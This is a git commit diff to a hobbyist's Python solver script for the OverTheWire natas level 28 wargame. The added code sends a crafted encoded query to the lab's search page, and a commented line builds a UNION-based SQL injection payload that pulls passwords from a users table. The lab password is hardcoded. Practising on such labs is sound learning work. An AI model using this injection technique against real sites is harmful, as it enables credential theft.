641d3b64a661417324b01bd0c6b1486a52b31071
Thewessen <sthewessen@gmail.com>
2019-04-15 08:24:00 +0200

    Completed leviathan! Now moving on to krypton. Saving natas for a bit...

--- OverTheWire/natas/test.py
+++ OverTheWire/natas/test.py
@@ -5,28 +5,30 @@ import base64
 from requests.auth import HTTPBasicAuth
 from urllib.parse import unquote
 
-uri = 'http://natas28.natas.labs.overthewire.org/index.php'
+uri = 'http://natas28.natas.labs.overthewire.org/search.php'
 username = 'natas28'
 password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'
 
 chars = ''.join([string.digits, string.ascii_letters])
 
+q = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjP%2BBS%2F9pc8w2qC%2BE%2BBLksZLnOKX%2FtKRQAkZ3UXWuWWu9bzTfM5xp7c4R9mULvO1icC'
+q2 = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPaJVX7bAcwqZXM9uUTxYlTIwR8Wnw2MK57yc5ARA14rBI6UIv1MRoBmli0v6rbKYZp3PzGFCUqgFAjx%2BX0DfThWeMV3Pswo%2BHDk9OvGyAcKQ%3D'
 
 # params = '&'.join(['%s=%s' % (k, v) for k, v in Data.items()])
 # print(params)
-for i in chars:
-    Data = {'query' : i}
-#     Data = {'query' : i,
-#             'table' : 'users',
-#             'username': 'natas' + i}
-    p = requests.post( uri,
-            auth=HTTPBasicAuth(username, password),
-            # data = Data)
-            params = Data)
-        # json = '{' + ', '.join(['%s : %s' % (k, v) for k, v in Data.items()]) + '}'
-    query =  p.url.split('=')[1]
-    print( base64.b64decode(unquote(query)) )
-# print( '\n'.join( p.text.split('\r\n')[24:]) + '\n\n' )
+# for i in range(32):
+# Data = {'query' : "a"*9 + "'" + " UNION (SELECT password from users)#" + "a"*i}
+    # p = requests.post( uri,
+    #         auth=HTTPBasicAuth(username, password),
+    #         params = Data)
+p = requests.get( uri,
+        auth=HTTPBasicAuth(username, password),
+        params = q2)
+    # query =  p.url.split('=')[1]
+    # print( query )
+    # json = '{' + ', '.join(['%s : %s' % (k, v) for k, v in Data.items()]) + '}'
+    # json = "a*" + str(i)
+print( '\n'.join( p.text.split('\r\n')[13:]) )
 
 # f = open('./query.txt')
 # lines = [line.rstrip('\n') for line in f]
@@ -36,4 +38,6 @@ for i in chars:
 
 # for q in queries:
 #     print( base64.b64decode(unquote(q).decode('utf8')) ) 
+
+
 
